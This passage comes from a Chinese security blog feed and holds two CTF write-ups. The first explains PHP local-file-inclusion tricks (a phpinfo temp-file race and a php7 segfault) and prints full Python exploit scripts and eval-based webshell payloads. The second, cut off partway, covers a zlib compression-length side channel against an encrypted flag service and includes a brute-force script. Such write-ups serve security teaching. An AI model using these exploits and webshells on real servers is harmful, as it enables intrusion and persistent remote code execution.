class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>dir.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>例题2（php5）<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($a,<span class="string">'flag'</span>)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>phpinfo.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>两道题的最终目标都是拿到根目录的flag</p><h2 id="phpinfo-LFI"><a href="#phpinfo-LFI" class="headerlink" title="phpinfo+LFI"></a>phpinfo+LFI</h2><p>我们看到例题2：<br>我们有文件包含，那么我们可以轻易的用伪协议泄露源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>这是老生常谈的问题，无需多讲，重点在于如何去读取根目录的flag<br>最容易想到的是利用包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?file=/flag</span><br></pre></td></tr></table></figure></p><p>但是由于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($a,<span class="string">'flag'</span>)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们并不能进行读取，那么很容易想到，尝试getshell<br>这里我们可以介绍第一个trick，即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。<br>我们简单写一个测试脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php echo 'sky is cool!';"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://ip/phpinfo.php"</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>可以看到回显中有如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_FILES[&quot;file&quot;]</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; test.txt</span><br><span class="line">    [type] =&gt; application/octet-stream</span><br><span class="line">    [tmp_name] =&gt; /tmp/phptZQ0xZ</span><br><span class="line">    [error] =&gt; 0</span><br><span class="line">    [size] =&gt; 26</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>我们只要利用这一特性，进行包含getshell即可<br>首先我们利用正则匹配，提取临时文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(r&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;, r.content).group(0)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-04-08-14-11-14.png" alt=""><br>接下来就是条件竞争的问题：如何在文件临时文件消失前，包含到它<br>这里为了事半功倍，我搜集了一些资料和原理：<br>1.临时文件在phpinfo页面加载完毕后才会被删除<br>2.phpinfo页面会将所有数据都打印出来，包括header<br>3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接<br>(来自ph牛:<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a>)<br>那么我们的竞争流程可以总结为：<br>1.发送包含了webshell的上传数据包给phpinfo页面，同时在header中塞满垃圾数据。<br>2.因为phpinfo页面会将所有数据都打印出来，垃圾数据会加大phpinfo加载时间。<br>3.直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包。<br>4.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除。<br>5.利用这个时间差，在第二个数据包进行文件包含漏洞的利用，即可成功包含临时文件，最终getshell<br>同时，对于webshell也有讲究，因为包含过程比较麻烦，如果使用一次性一句话木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[sky]);</span><br></pre></td></tr></table></figure></p><p>则每次执行命令，都要进行一次包含，耗时耗力，所以我们选择包含后写入文件的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&apos;/tmp/sky&apos;, &apos;&lt;?php @eval($_REQUEST[sky]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure></p><p>这样一旦包含成功，该shell就会在tmp目录下永久留下一句话木马文件sky，下次利用直接轻松包含即可~<br>尝试进行exp编写<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(host,port)</span>:</span></span><br><span class="line">padding = <span class="string">'sky'</span>*<span class="number">2000</span></span><br><span class="line">payload=<span class="string">"""sky test!&lt;?php file_put_contents('/tmp/sky', '&lt;?php eval($_REQUEST[sky]);?&gt;');?&gt;\r"""</span></span><br><span class="line"></span><br><span class="line">request1_data =<span class="string">"""------WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="test.php"\r</span></span><br><span class="line"><span class="string">Content-Type: text/php\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">------WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">Submit\r</span></span><br><span class="line"><span class="string">------WebKitFormBoundary9MWZnWxBey8mbAQ8--\r</span></span><br><span class="line"><span class="string">"""</span> % payload</span><br><span class="line"></span><br><span class="line">request1 = <span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: skypadding="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0\r</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1\r</span></span><br><span class="line"><span class="string">Origin: null\r</span></span><br><span class="line"><span class="string">Accept: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">User-Agent: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Accept-Language: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s:%s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(request1_data),host,port,request1_data)</span><br><span class="line"></span><br><span class="line">request2 = <span class="string">"""GET /index.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s:%s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">return</span> (request1,request2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host,port,request1)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(request1)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i       </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'not fonud'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpinfo_LFI</span><span class="params">(host,port,offset,request1,request2)</span>:</span></span><br><span class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s1.connect((host,port))</span><br><span class="line">s2.connect((host,port))</span><br><span class="line"></span><br><span class="line">s1.send(request1)</span><br><span class="line">d = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">d += s1.recv(offset)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">s2.send(request2 % (fn,host,port))</span><br><span class="line">tmp = s2.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">if</span> tmp.find(<span class="string">"sky test!"</span>) != <span class="number">-1</span>:</span><br><span class="line"><span class="keyword">return</span> fn</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">s1.close()</span><br><span class="line">s2.close()</span><br><span class="line"></span><br><span class="line">attempts = <span class="number">1000</span></span><br><span class="line">host = <span class="string">"ip"</span></span><br><span class="line">port = <span class="string">"port"</span></span><br><span class="line">request1,request2 = init(host,port)</span><br><span class="line">offset = getOffset(host,port,request1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,attempts):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"try:"</span>+str(i)+<span class="string">"/"</span>+str(attempts)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line">res = phpinfo_LFI(host,port,offset,request1,request2)</span><br><span class="line"><span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'You can getshell with /tmp/sky!'</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>编写还是非常容易的，知道原理后，其实不存在多少条件竞争，最多尝试个10次左右就可以达成目的<br>随后我们就可以轻松getshell<br><img src="/images/2019-04-08-16-46-13.png" alt=""></p><h2 id="LFI-php7崩溃"><a href="#LFI-php7崩溃" class="headerlink" title="LFI+php7崩溃"></a>LFI+php7崩溃</h2><p>前一题我们能做，得益于phpinfo的存在，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell<br>但如果目标不存在phpinfo，应该如何处理呢？<br>这里可以用<code>php7 segment fault</code>特性<br>我们可以利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</span><br></pre></td></tr></table></figure></p><p>这样的方式，使php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除：<br><img src="/images/2019-04-08-16-52-42.png" alt=""><br>这样就能达成我们getshell的目的，脚本相对容易很多：<br><img src="/images/2019-04-08-16-59-54.png" alt=""><br>加上我们有dir.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>可以进行目录列举，我们只要找到临时文件名即可：<br>编写exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">'&lt;?php eval($_REQUEST[sky]);'</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">'http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">url = <span class="string">'http://ip/dir.php'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">data = re.search(<span class="string">r"php[a-zA-Z0-9]&#123;1,&#125;"</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line">url = <span class="string">"http://ip/index.php?file=/tmp/"</span>+data</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'sky'</span>:<span class="string">"readfile('/flag');"</span></span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>运行即可看到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python myexp2.py</span><br><span class="line">include $_GET[&apos;file&apos;]flag&#123;LFI_php7~&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>两则还算使用的trick，先mark一下~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近遇到一些文件包含的题目，在本篇文章记录两个trick~&lt;/p&gt;
&lt;h2 id=&quot;环境背景&quot;&gt;&lt;a href=&quot;#环境背景&quot; class=
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub-Always be with U-Writeup</title>
    <link href="http://skysec.top/2019/03/29/Pwnhub-Always-be-with-U-Writeup/"/>
    <id>http://skysec.top/2019/03/29/Pwnhub-Always-be-with-U-Writeup/</id>
    <published>2019-03-29T13:54:02.000Z</published>
    <updated>2019-04-03T09:48:45.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正逢pwnhub有比赛，于是做了一下题目，以下是题解</p><h2 id="Happy-Tree-Friends"><a href="#Happy-Tree-Friends" class="headerlink" title="Happy Tree Friends"></a>Happy Tree Friends</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>拿到题目<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"flag.txt"</span>).read()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = input()</span><br><span class="line">    data = <span class="string">"message: %s, flag: %s"</span> % (data, flag)</span><br><span class="line">    compressed = zlib.compress(data.encode())</span><br><span class="line">    <span class="keyword">if</span> len(compressed) % <span class="number">16</span>:</span><br><span class="line">        compressed += <span class="string">b"\x00"</span> * (<span class="number">16</span> - len(compressed) % <span class="number">16</span>)</span><br><span class="line">    encrypted = AES.new(</span><br><span class="line">        md5(flag.encode()).digest(), AES.MODE_CBC, os.urandom(<span class="number">16</span>)</span><br><span class="line">    ).encrypt(compressed)</span><br><span class="line">    print(encrypted.hex())</span><br></pre></td></tr></table></figure></p><p>发现有如下操作<br>1.接收输入的值<br>2.将输入值和flag放在一起<br>3.使用zlib进行压缩<br>4.将压缩结果进行padding<br>5.使用AES加密<br>6.返回加密值</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>本想对AES进行攻击，但只可控明文，还要经过zlib压缩，应该不太靠谱，于是往zlib压缩算法上考虑<br>查阅资料得知<br>zlib应该是参考了Rabin–Karp字符串查找算法，即使用hash方法来确定一个字符串是否在前面出现过。zlib压缩过程中会维护一个比较大的hash值数组，这个数组存储了数据流中每3个字符组成的字符串的hash值，例如4、5、6号字符计算一个hash值，5、6、7号字符也计算一个hash值。<br>计算出的hash值作为下标，用来在hash值数组里存储当前三字字符串的下标。当数据流中出现一个新字符时，和之前的两个字符组成一个字符串，计算hash值，看在hash数组里该值的位置是否已经有值，有的话就取出这个值(上一次得到这个hash值的三个字符的下标)，检查是否是有效匹配。可以将查找过程理解为一个查字典的过程，只不过这个字典的条目也是处理过程中逐渐生成、逐渐抛弃的。<br>我们编写测试脚本可以发现<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">flag = <span class="string">'flag&#123;148731984637&#125;'</span></span><br><span class="line">data1 = <span class="string">'fla'</span></span><br><span class="line">data1 = <span class="string">"message: %s, flag: %s"</span> % (data1, flag)</span><br><span class="line">data2 = <span class="string">'dfa'</span></span><br><span class="line">data2 = <span class="string">"message: %s, flag: %s"</span> % (data2, flag)</span><br><span class="line"><span class="keyword">print</span> len(zlib.compress(data1.encode()))</span><br><span class="line"><span class="keyword">print</span> len(zlib.compress(data2.encode()))</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-29-22-19-56.png" alt=""><br>由于压缩算法：<br>data1字符串中存在2次flag，如果data中有fla存在，则fla存在3次，压缩结果最短<br>而data2字符串中除了fla外，任意3种字符串，压缩后都没有data1压缩长度短<br>那么我们可以利用这种方式，通过长度进行侧信道，进行flag碰撞爆破，一旦出现flag中的字符，则加密结果明显变短<br>同时我们发现<br><img src="/images/2019-03-29-22-24-39.png" alt=""><br>当我们已知前几位后，后面爆破的结果，一旦匹配，则长度始终为最短值，即39<br>这样，如果开头是flag{，那么我们即可1位1位匹配，寻找长度为最短值的字符即可</p><h3 id="题目测试"><a href="#题目测试" class="headerlink" title="题目测试"></a>题目测试</h3><p>知道原理后，我们测试题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br><span class="line">496f7e60ae407bb1020fc5d97898270cec9c8495cf0ca52d93d3dd74d4ae8cb0732dd45736a79ec8f921cd9cc893c08eb250f54ca27c1bf5e74b69fdcfef7ba4</span><br><span class="line"></span><br><span class="line">flag&#123;</span><br><span class="line">bfe7b29ddccb4d0b4e538f224247801fdc9d8a518070cc38527152f1237cb6b96f22d30de1d7658bd71513bf1fcc58c950114a5c1c25907087d599fd83ef7a83</span><br><span class="line"></span><br><span class="line">flag&#123;a</span><br><span class="line">b8c5ce562800a8209ddc31527a76758a50568cd51d256730be9ba0850cdaeae092656f305a92d1ff6bea09ea25745067aa27e16003acdf9e8a599f296d43b4b8d326ac1a9176be5ebc2866f8eb75ab56</span><br><span class="line"></span><br><span class="line">flag&#123;b</span><br><span class="line">6a2b03216022caa3d7958767a86ef304858e9bf3e7303df3d27deaad6a9ddfa2603ee16dfe9b6b967805a527dd944a508d81b56a1bf32e4ea770b1334b17b6e17b93d95badb2429bf0f1a591c7cd914d</span><br><span class="line"></span><br><span class="line">flag&#123;c</span><br><span class="line">ebfd61a158e220ce16fd53b31c1e4e67df928a883b187c66c98be71f11cf43df1abe6cfd3365da603c92beaa8e30c23cb94d420c8d392fa6b457369263e35bb0847a116cb31135ea57e6bcf18a083e42</span><br><span class="line"></span><br><span class="line">flag&#123;d</span><br><span class="line">aef61242ad1cf6f7b645b73c486df9d9a8985eeb38c7c4e16d71c19b9ed05cf6def29c3c236ed126af90f2c467507a3a3b4fecdb4129f257bf567935f43e2b84</span><br></pre></td></tr></table></figure></p><p>发现如果是flag的格式，并与flag一致，则长度为129，其余都为161，于是可以按位爆破，写出脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits + <span class="string">'abcdef-'</span></span><br><span class="line">s = remote(<span class="string">"40.73.22.31"</span>, <span class="string">"2333"</span>)</span><br><span class="line">flag = <span class="string">'flag&#123;de12473b-'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">tmp = flag+i</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">s.sendline(tmp)</span><br><span class="line">res = s.recvline()</span><br><span class="line"><span class="keyword">print</span> len(res)</span><br><span class="line"><span class="keyword">if</span> len(res)==<span class="number">129</span>:</span><br><span class="line">flag +=i</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>但发现跑完只得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;de12473b-</span><br></pre></td></tr></table></figure></p><p>后面字母跑出来，长度都是161，思考一下<br>发现这里还有AES，如果我输入的太长，就算原文被压缩，长度变短后，加密后还是会变长<br>所以并不能带这么一长串进行攻击，需要几个几个一爆。<br>同时发现<br><img src="/images/2019-03-30-17-18-28.png" alt=""><br>flag和de12虽然都在flag{}里出现，但是flag时候明显短<br>估计是因为消息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;message: %s, flag: %s&quot; % (data, 